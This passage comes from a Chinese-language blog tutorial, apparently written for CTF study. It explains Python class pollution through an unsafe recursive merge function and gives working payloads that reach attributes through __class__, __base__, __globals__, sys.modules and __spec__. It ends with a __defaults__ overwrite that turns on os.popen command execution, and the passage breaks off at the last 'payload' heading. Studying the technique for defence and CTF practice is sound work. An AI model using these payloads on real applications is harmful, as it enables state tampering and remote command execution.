<p>src&#x3D;{‘secret’：’no way’}   dst&#x3D;&lt;class ‘<strong>main</strong>.father’#子类继承父类</p>
<p>在python中子类可以通过base属性来查找其直接父类，<code>__class__</code> 属性用于访问对象所属的类，而 <code>__base__</code> 属性用于访问类的直接父类。如果类有多个父类，则可以通过 <code>__bases__</code> 属性来访问所有的父类。</p>
<p>可以看到这里经过if判断，由于v已经不满足字典类型所以调用了setattr(dst,k,v)</p>
<p>那么到这里就等于已经实现了污染，因为我们调用setattr(dst，k,v)修改了father类中的srcret的值</p>
<p>我们可以输出一下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(son_a.secret)</span><br><span class="line">print(instance.secret)</span><br><span class="line">merge(payload, instance)</span><br><span class="line">print(son_a.secret)</span><br><span class="line">print(instance.secret)</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714091935670.png"
                      alt="image-20230714091935670" style="zoom:200%;" 
                >

<p>通过上面的分析我们可以看到这个和javascript中利用merge函数进行原型链污染的过程是非常相似的。不同的一点是在javascript中是利用__proto 沿着原型链向上查找进行污染，而在这里是通过getattr()配合class和base属性最终到我们要污染的类里面。</p>
<h5 id="修改内置属性"><a href="#修改内置属性" class="headerlink" title="修改内置属性"></a>修改内置属性</h5><p>上面的例子我们是通过污染去修改自定义属性，我们还可以通过这种方法去修改内置属性</p>
<p>例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">class father:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class son_a(father):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class son_b(father):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__class__&quot; : &#123;</span><br><span class="line">        &quot;__base__&quot; : &#123;</span><br><span class="line">            &quot;__str__&quot; : &quot;Polluted ~&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(father.__str__)</span><br><span class="line">merge(payload, instance)</span><br><span class="line">print(father.__str__)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714092734324.png"
                      alt="image-20230714092734324"
                ></p>
<p>这里的污染过程和上面就很类似了，只不过我们上面污染的是自定义属性，这里污染的是内置属性</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714093231149.png"
                      alt="image-20230714093231149"
                ></p>
<p>可以看到，这里最终也是调用setattr方法，把dst中的<code>__str__</code> 值修改为Polluted ~</p>
<h5 id="无法被污染的object"><a href="#无法被污染的object" class="headerlink" title="无法被污染的object"></a>无法被污染的object</h5><p>在前面我们提了并不是所有类的属性都可以被污染，对于某些特殊的内置类（如<code>object</code>），它们的属性通常被设计为只读或不可修改。这意味着无法直接通过属性值查找来获取或修改这些类的属性。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__class__&quot; : &#123;</span><br><span class="line">            &quot;__str__&quot; : &quot;Polluted ~&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">merge(payload, object)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714094203421.png"
                      alt="image-20230714094203421"
                ></p>
<p>这种情况下，便没有办法进行污染，而且在上面我们查找父类是通过<code>__base__</code>属性来实现的，但是如果目标类与切入点或实例没有继承关系时，我们就没有办法再去进行污染，在这种情况下可以考虑使用其他机制或方法来实现对目标类的切入点或属性的查找。一种常见的方式是通过自定义方法或特殊的接口来访问和操作目标类的属性。</p>
<h5 id="通过全局变量global获取"><a href="#通过全局变量global获取" class="headerlink" title="通过全局变量global获取"></a>通过全局变量global获取</h5><p>在Python中，函数对象和类方法对象都具有一个特殊属性 <code>__globals__</code>，该属性提供了函数或方法所声明的变量空间中的全局变量的字典形式。它类似于 <code>globals()</code> 函数的返回值，但只包含函数或方法的作用域内的全局变量。但是内置方法（<code>__int__,__str__</code>）的类型在没有被重写时是装卸器，只有在重写后才变为函数类型，这是因为内置方法在初始定义时是特殊的描述符对象，它们具有特定的行为和功能。一旦在子类中重写了内置方法，它将变为普通的函数对象，具有与普通函数相同的属性和行为。无论是装饰器还是函数，这些方法都可以通过 <code>__globals__</code> 属性访问其变量空间中的全局变量。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">secret_var = 114</span><br><span class="line"></span><br><span class="line">def b():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class a:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line">print(b.__globals__)</span><br><span class="line">print(&quot;--------------------------------------------------------------&quot;)</span><br><span class="line">print(globals())</span><br><span class="line">print(&quot;--------------------------------------------------------------&quot;)</span><br><span class="line">print(a.__init__.__globals__)</span><br><span class="line">print(&quot;--------------------------------------------------------------&quot;)</span><br><span class="line">print(b.__globals__ == globals() == a.__init__.__globals__)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714100231161.png"
                      alt="image-20230714100231161"
                ></p>
<p>可以看到我们可以通过globals查看对象的全局变量</p>
<p>那么这样我们即使无继承关系也可以修改目标类的类属性甚至全局变量</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">secret_var = 114</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class a:</span><br><span class="line">    secret_class_var = &quot;secret&quot;</span><br><span class="line"></span><br><span class="line">class b:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = b()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">            &quot;__globals__&quot; : &#123;</span><br><span class="line">                &quot;secret_var&quot; : 514,</span><br><span class="line">                &quot;a&quot; : &#123;</span><br><span class="line">                    &quot;secret_class_var&quot; : &quot;Pooooluted ~&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">print(a.secret_class_var)</span><br><span class="line">#secret</span><br><span class="line">print(secret_var)</span><br><span class="line">#114</span><br><span class="line">merge(payload, instance)</span><br><span class="line">print(a.secret_class_var)</span><br><span class="line">#Pooooluted ~</span><br><span class="line">print(secret_var)</span><br><span class="line">#514</span><br></pre></td></tr></table></figure></div>

<p>这里仍然打断点调试分析一下污染的过程：</p>
<p>第一次执行merge()</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714101602589.png"
                      alt="image-20230714101602589"
                ></p>
<p>第二次调用merge()</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714101833276.png"
                      alt="image-20230714101833276"
                ></p>
<p>到第二次调用这个merge()可以看到此时的k&#x3D;<code>__globals__</code> </p>
<p>当我们在第二次调用结束后会进行第三次的调用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">merge(v, getattr(dst, k))</span><br></pre></td></tr></table></figure></div>

<p>此时 dst&#x3D;&lt;bound method b.__init__ of &lt;blog5.b object at 0x000001D676AA5C90&gt;&gt;</p>
<p>​             k&#x3D;<code>__globals__</code></p>
<p>那么我们在执行getattr(dst,k)的时候就会获取到dst的全局变量，从而我们就可以找到我们的污染对</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714102415359.png"
                      alt="image-20230714102415359"
                ></p>
<p>然后我们通过我们获取到的全局变量去查找我们要修改的属性值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714102602851.png"
                      alt="image-20230714102602851"
                ></p>
<p>可以看到我们在我们获取到的全局变量中找到了我们要修改的属性值secret_var</p>
<p>然后由于到这里v不再是字典类型了</p>
<p>那么我们这里就会调用dst[k]&#x3D;v</p>
<p>进行污染我们的目标属性</p>
<p>那么到这里我们便同全局变量globals获取到我们的目标属性值，并进行了污染。</p>
<h5 id="通过已加载模块获取"><a href="#通过已加载模块获取" class="headerlink" title="通过已加载模块获取"></a>通过已加载模块获取</h5><p>在某些情况下，我们可能需要获取其他模块中定义的类对象或属性，尽管我们的操作位置在入口文件中。为了实现这一点，可以通过其他已经加载过的模块进行获取。</p>
<h6 id="加载关系简单的"><a href="#加载关系简单的" class="headerlink" title="加载关系简单的"></a>加载关系简单的</h6><p>一些模块的加载关系比较简单，我们直接可以通过imporant语句部分来找到我们的目标模块，那么到这个时候我们就可以通过全局变量来获取目标模块。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#test.py</span><br><span class="line"></span><br><span class="line">import test_1</span><br><span class="line"></span><br><span class="line">class cls:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;test_1&quot; : &#123;</span><br><span class="line">                &quot;secret_var&quot; : 514,</span><br><span class="line">                &quot;target_class&quot; : &#123;</span><br><span class="line">                    &quot;secret_class_var&quot; : &quot;Poluuuuuuted ~&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(test_1.secret_var)</span><br><span class="line">#secret</span><br><span class="line">print(test_1.target_class.secret_class_var)</span><br><span class="line">#114</span><br><span class="line">merge(payload, instance)</span><br><span class="line">print(test_1.secret_var)</span><br><span class="line">#514</span><br><span class="line">print(test_1.target_class.secret_class_var)</span><br><span class="line">#Poluuuuuuted ~</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#test_1.py</span><br><span class="line"></span><br><span class="line">secret_var = 114</span><br><span class="line"></span><br><span class="line">class target_class:</span><br><span class="line">    secret_class_var = &quot;secret&quot;</span><br></pre></td></tr></table></figure></div>

<h6 id="加载关系复杂的"><a href="#加载关系复杂的" class="headerlink" title="加载关系复杂的"></a>加载关系复杂的</h6><p>在我们的真是环境或者时遇到的题目中往往是多层模块导入，甚至是存在于内置模块或三方模块中导入，这个时候我们通过看imporant语法部分就不太现实了，但是我们可以利用sys模块进行查找。</p>
<p><code>sys</code> 是一个内置模块，它提供了与 Python 解释器的运行时环境和系统交互相关的函数和变量。通过导入 <code>sys</code> 模块，我们可以访问和操作与系统交互相关的功能。</p>
<p><code>sys.modules</code> 中包含了当前解释器中已经加载的模块，包括内置模块、标准库模块和自定义模块。每个模块对象在首次被导入时会被添加到 <code>sys.modules</code> 中，以便之后的导入操作可以直接从该字典中获取相应的模块对象，而无需重新加载。<code>sys.modules</code> 提供了一种方便的方式来获取和操作已加载的模块对象。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#test.py</span><br><span class="line"></span><br><span class="line">import test_1</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">class cls:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;sys&quot; : &#123;</span><br><span class="line">                &quot;modules&quot; : &#123;</span><br><span class="line">                    &quot;test_1&quot; : &#123;</span><br><span class="line">                        &quot;secret_var&quot; : 514,</span><br><span class="line">                        &quot;target_class&quot; : &#123;</span><br><span class="line">                            &quot;secret_class_var&quot; : &quot;Poluuuuuuted ~&quot;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(test_1.secret_var)</span><br><span class="line">#secret</span><br><span class="line">print(test_1.target_class.secret_class_var)</span><br><span class="line">#114</span><br><span class="line">merge(payload, instance)</span><br><span class="line">print(test_1.secret_var)</span><br><span class="line">#514</span><br><span class="line">print(test_1.target_class.secret_class_var)</span><br><span class="line">#Poluuuuuuted ~</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#test_1.py</span><br><span class="line"></span><br><span class="line">secret_var = 114</span><br><span class="line"></span><br><span class="line">class target_class:</span><br><span class="line">    secret_class_var = &quot;secret&quot;</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714104439697.png"
                      alt="image-20230714104439697"
                ></p>
<p>同样的我们这里还是打断点分析调试：</p>
<p>第一次调用merge()</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714104614297.png"
                      alt="image-20230714104614297"
                ></p>
<p>然后到最后我们可以发现到最后仍然是调用了merge()进行递归这里的key值是int对dst进行了初始化</p>
<p>继续跟进：</p>
<p>第二次调用merge()</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714104750918.png"
                      alt="image-20230714104750918"
                ></p>
<p>通过变量值我们可以看到k&#x3D;<code>__globals__</code>,那么到最后仍然是调用merge()</p>
<p>当然这里同样使用了getattr通过globals属性去查找全局变量</p>
<p>继续跟进</p>
<p>第三次调用merge()</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714105102180.png"
                      alt="image-20230714105102180"
                ></p>
<p>这里是进入了第一个if语句，但是同样的还是调用merge()进行递归，不同的是dst的值改为了dst.get(k),这里我们的k值是sys</p>
<p>那么这里就是获取到全局变量中sys模块对应的值</p>
<p>我们继续跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714110026048.png"
                      alt="image-20230714110026048"
                ></p>
<p>这里在最好调用了sys的modules模块</p>
<p>继续跟进：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714110219632.png"
                      alt="image-20230714110219632"
                ></p>
<p>我们可以看到到这里我们通过dst.get(k)使用sys的modules模块找到了我们目标模块的位置</p>
<p>那么后面的污染过程就和我们上面的一样了，找到目标类的目标属性进行污染</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714110519208.png"
                      alt="image-20230714110519208"
                ></p>
<h6 id="sys模块未导入"><a href="#sys模块未导入" class="headerlink" title="sys模块未导入"></a>sys模块未导入</h6><p>在上面的例子中我们是导入了sys模块，但是在实际环境中大部分都不会导入sys模块</p>
<p>那么我们如果想要使用这种方法，那我们就要先要通过paylaod找到sys模块，然后再去调用，这样问题就从寻找<code>import</code>特定模块的语句转换为寻找<code>import</code>了sys模块的语句。</p>
<p>在参考博客的文章中，大佬说这样对问题的解决并不见得有多少优化，所以为了进一步优化这个问题，这里采用的是python加载器中的loader模块</p>
<p>在 Python 中，加载器（Loader）是用于加载模块的组件。加载器负责解析模块的源代码、编译代码（如果需要），并创建模块对象供程序使用。</p>
<p>Python 提供了不同类型的加载器来适应不同的模块加载场景，其中一些常见的加载器包括：</p>
<ol>
<li>Source File Loader（源文件加载器）：用于从源代码文件加载模块。它根据模块的路径查找对应的源代码文件，并读取、解析、编译并创建模块对象。<code>importlib</code> 模块中的 <code>SourceFileLoader</code> 类提供了源文件加载器的实现。</li>
<li>Extension Module Loader（扩展模块加载器）：用于加载编译为共享库的扩展模块。它将共享库加载到 Python 解释器中，并创建模块对象。这种加载器通常用于加载用 C&#x2F;C++ 编写的模块。<code>importlib</code> 模块中的 <code>ExtensionFileLoader</code> 类提供了扩展模块加载器的实现。</li>
<li>Frozen Module Loader（冻结模块加载器）：用于加载被冻结（打包）为单个文件的模块。冻结模块是将模块及其依赖项打包成一个独立的文件，以便在没有源代码的情况下进行加载和使用。<code>importlib</code> 模块中的 <code>FrozenImporter</code> 类提供了冻结模块加载器的实现。</li>
<li>Namespace Package Loader（命名空间包加载器）：用于加载命名空间包。命名空间包是一个虚拟的包，由多个独立的目录或包组成。命名空间包加载器会根据不同的目录或包来加载对应的子模块。<code>importlib</code> 模块中的 <code>NamespaceLoader</code> 类提供了命名空间包加载器的实现。</li>
</ol>
<p>其实这里简单来说loader就是为实现模块加载而设计的类。</p>
<p>通过上面的关于loader的了解我没可以知道其在importlib中有具体的实现。</p>
<p>通过了解<code>importlib</code> 模块是 Python 中用于处理模块导入的核心模块之一，并且在其所有的 Python 文件中引入了 <code>sys</code> 模块。这样可以确保在使用 <code>importlib</code> 模块时能够方便地访问和操作 <code>sys</code> 模块提供的功能</p>
<p>那我们就可以通过importlib去找到我们要调用的sys模块</p>
<p>这里参考博客文章上面给出了验证代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib.__init__&quot;)))</span><br><span class="line">#True</span><br><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib._bootstrap&quot;)))</span><br><span class="line">#True</span><br><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib._bootstrap_external&quot;)))</span><br><span class="line">#True</span><br><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib._common&quot;)))</span><br><span class="line">#True</span><br><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib.abc&quot;)))</span><br><span class="line">#True</span><br><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib.machinery&quot;)))</span><br><span class="line">#True</span><br><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib.metadata&quot;)))</span><br><span class="line">#True</span><br><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib.resources&quot;)))</span><br><span class="line">#True</span><br><span class="line">print(&quot;sys&quot; in dir(__import__(&quot;importlib.util&quot;)))</span><br><span class="line">#True</span><br></pre></td></tr></table></figure></div>

<p>通过代码验证我们可以看到都导入的有sys模块</p>
<p>所以只要我们能过获取到一个<code>loader</code>便能用如<code>loader.__init__.__globals__[&#39;sys&#39;]</code>的方式拿到<code>sys</code>模块，这样进而获取目标模块。</p>
<p>那么现在又出现了一个新的问题，loader好获取吗？如何获取？</p>
<p> Python 中，模块的加载和导入是由 Python 解释器自动处理的。当您使用 <code>import</code> 语句导入一个模块时，Python 解释器会自动查找该模块并加载它。</p>
<p>Python 的模块加载器会根据一定的搜索路径来查找和加载模块。搜索路径包括内置模块、已安装的第三方库以及您自己编写的模块所在的目录。Python 解释器会按照特定的顺序搜索这些路径，直到找到所需的模块。</p>
<p>对于一个模块来说，模块中的一些内置属性会在被加载时自动填充</p>
<p><code>__loader__</code>内置属性会被赋值为加载该模块的<code>loader</code>，这样只要能获取到任意的模块便能通过<code>__loader__</code>属性获取到<code>loader</code>，而且对于<code>python3</code>来说除了在<code>debug</code>模式下的主文件中<code>__loader__</code>为<code>None</code>以外，正常执行的情况每个模块的<code>__loader__</code>属性均有一个对应的类</p>
<p><code>_spec__</code>内置属性在<code>Python 3.4</code>版本引入，其包含了关于类加载时的信息，本身是定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>，显然因为定义在<code>importlib</code>模块下的<code>py</code>文件，所以可以直接采用<code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>获取到<code>sys</code>模块</p>
<p>由于<code>ModuleSpec</code>的属性值设置，相对于上面的获取方式，还有一种相对长的<code>payload</code>的获取方式，主要是利用<code>ModuleSpec</code>中的<code>loader</code>属性。如属性名所示，该属性的值是模块加载时所用的<code>loader</code>，在源码中如下所示：</p>
<p><a href="https://storage.tttang.com/media/attachment/2023/01/27/b8316779-fc64-4479-b7da-151e11ace366.png"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/b8316779-fc64-4479-b7da-151e11ace366.png"
                      alt="image-20230122204320376"
                ></a></p>
<p>所以有这样的相对长的<code>Payload</code>：<code>&lt;模块名&gt;.__spec__.loader.__init__.__globals__[&#39;sys&#39;]</code></p>
<h6 id="实际环境中的合并函数"><a href="#实际环境中的合并函数" class="headerlink" title="实际环境中的合并函数"></a>实际环境中的合并函数</h6><p>根据学习文章的作者所述，依据原博主所述，目前发现了<code>Pydash</code>模块中的<code>set_</code>和<code>set_with</code>函数具有如上实例中<code>merge</code>函数类似的类属性赋值逻辑，能够实现污染攻击。所以说python的原型链污染攻击的条件有点苛刻。</p>
<h5 id="函数形参默认值替换"><a href="#函数形参默认值替换" class="headerlink" title="函数形参默认值替换"></a>函数形参默认值替换</h5><p>在学习之前我们先了解一下函数的<code>__defaults__</code>和<code>__kwdefaults__</code>这两个内置属性</p>
<p><strong>defaults</strong></p>
<p><code>__defaults__</code>以元组的形式按从左到右的顺序收录了函数的位置或键值形参的默认值，<code>__defaults__</code> 是 Python 中函数对象的内置属性之一，用于访问函数的默认参数值。它是一个元组，包含了函数定义中位置参数的默认值，如果函数定义中某个位置参数具有默认值，那么该默认值会被存储在 <code>__defaults__</code> 属性中相应位置的元组元素中。如果函数没有定义位置参数的默认值，<code>__defaults__</code> 的值为 <code>None</code>。</p>
<p>示例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def my_function(a, b=10, c=None):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">defaults = my_function.__defaults__</span><br><span class="line">print(defaults) </span><br><span class="line"># (10, None)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def func_a(var_1, var_2 =2, var_3 = 3):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def func_b(var_1=1, /, var_2 =2, var_3 = 3):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def func_c(var_1=1, var_2 =2, *, var_3 = 3):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def func_d(var_1=1, /, var_2 =2, *, var_3 = 3):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">print(func_a.__defaults__)</span><br><span class="line">print(func_b.__defaults__)</span><br><span class="line">print(func_c.__defaults__)</span><br><span class="line">print(func_d.__defaults__)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714142848725.png"
                      alt="image-20230714142848725"
                ></p>
<p>通过替换属性就能够实现对函数位置或键值形参的默认值替换，但是该属性值要求为元组类型，而通常的如<code>JSON</code>等格式并没有元组这一数据类型设计概念，这就需要环境中有合适的解析输入的方式</p>
<p>污染示例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def evilFunc(arg_1 , shell = False):</span><br><span class="line">    if not shell:</span><br><span class="line">        print(arg_1)</span><br><span class="line">    else:</span><br><span class="line">        print(__import__(&quot;os&quot;).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line">class cls:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;evilFunc&quot; : &#123;</span><br><span class="line">                &quot;__defaults__&quot; : (</span><br><span class="line">                    True ,</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evilFunc(&quot;whoami&quot;)</span><br><span class="line">#whoami</span><br><span class="line">merge(payload, instance)</span><br><span class="line">evilFunc(&quot;whoami&quot;)</span><br><span class="line">#article-kelp</span><br></pre></td></tr></table></figure></div>

<p>首先看一下命令执行的代码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def evilFunc(arg_1 , shell = False):</span><br><span class="line">    if not shell:</span><br><span class="line">        print(arg_1)</span><br><span class="line">    else:</span><br><span class="line">        print(__import__(&quot;os&quot;).popen(arg_1).read())</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这个函数会对shell进行判断，如果false则将传入的参数arg_1打印输出，如果是true则调用os模块进行命令执行</p>
<p>那我们只需要把evilFunc的shell的默认值替换为true便能够进行命令执行</p>
<p>paylaod：</p>
